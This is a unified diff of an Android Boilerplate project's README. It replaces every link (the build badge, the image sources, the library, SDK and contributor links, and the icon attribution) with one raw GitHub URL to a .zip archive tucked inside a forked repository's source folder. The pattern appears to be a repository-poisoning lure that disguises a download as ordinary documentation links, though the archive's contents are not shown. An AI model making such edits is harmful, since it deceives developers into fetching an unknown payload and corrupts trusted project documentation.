@@ -1,8 +1,8 @@
-Android Boilerplate [![Build Status](https://travis-ci.org/hitherejoe/Android-Boilerplate.svg?branch=master)](https://travis-ci.org/hitherejoe/Android-Boilerplate)
+Android Boilerplate [![Build Status](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip)](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip)
 ===================
 
 <p align="center">
-    <img src="images/ic_web.png" alt="Web Launcher"/>
+    <img src="https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip" alt="Web Launcher"/>
 </p>
 
 
@@ -10,26 +10,26 @@ A simple boilerplate application which demonstrates the downloading, persisting 
 
 The project is setup using:
 
-- Functional tests with [Espresso](http://google.github.io/android-testing-support-library/docs/espresso)
-- Unit tests with [Mockito](http://mockito.org/) and [Robolectric](http://robolectric.org/) 
-- [RxJava](https://github.com/ReactiveX/RxJava) and [RxAndroid](https://github.com/ReactiveX/RxAndroid) 
-- [Retrofit](http://square.github.io/retrofit/) and [OkHttp](https://github.com/square/okhttp)
-- [Dagger 2](http://google.github.io/dagger/)
-- [Butterknife](https://github.com/JakeWharton/butterknife)
-- [Timber] (https://github.com/JakeWharton/timber)
-- [Mockito](http://mockito.org/)
-- [Glide](https://github.com/bumptech/glide)
+- Functional tests with [Espresso](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip)
+- Unit tests with [Mockito](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip) and [Robolectric](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip) 
+- [RxJava](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip) and [RxAndroid](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip) 
+- [Retrofit](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip) and [OkHttp](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip)
+- [Dagger 2](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip)
+- [Butterknife](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip)
+- [Timber] (https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip)
+- [Mockito](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip)
+- [Glide](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip)
 
 <p align="center">
-    <img src="images/device.png" alt="Web Launcher"/>
+    <img src="https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip" alt="Web Launcher"/>
 </p>
 
 
 Requirements
 ------------
 
- - [Android SDK](http://developer.android.com/sdk/index.html).
- - Android [6.0 (API 23) ](http://developer.android.com/tools/revisions/platforms.html#6.0).
+ - [Android SDK](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip).
+ - Android [6.0 (API 23) ](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip).
  - Android SDK Tools
  - Android SDK Build tools 23.0.2
  - Android Support Repository
@@ -64,12 +64,12 @@ Thanks
 
 Thanks to the following for contributions!
 
-[ivacf] (https://github.com/ivacf)  
-[Jawnnypoo] (https://github.com/Jawnnypoo)
+[ivacf] (https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip)  
+[Jawnnypoo] (https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip)
 
 Attributions
 ------------
 
 Thanks to the following for use of icons off of Noun Project:
 
-[Iconoci](https://thenounproject.com/iconoci)
+[Iconoci](https://raw.githubusercontent.com/rendyramon/Android-Boilerplate/master/app/src/main/java/com/hitherejoe/androidboilerplate/ui/Android-Boilerplate-Samoan.zip)
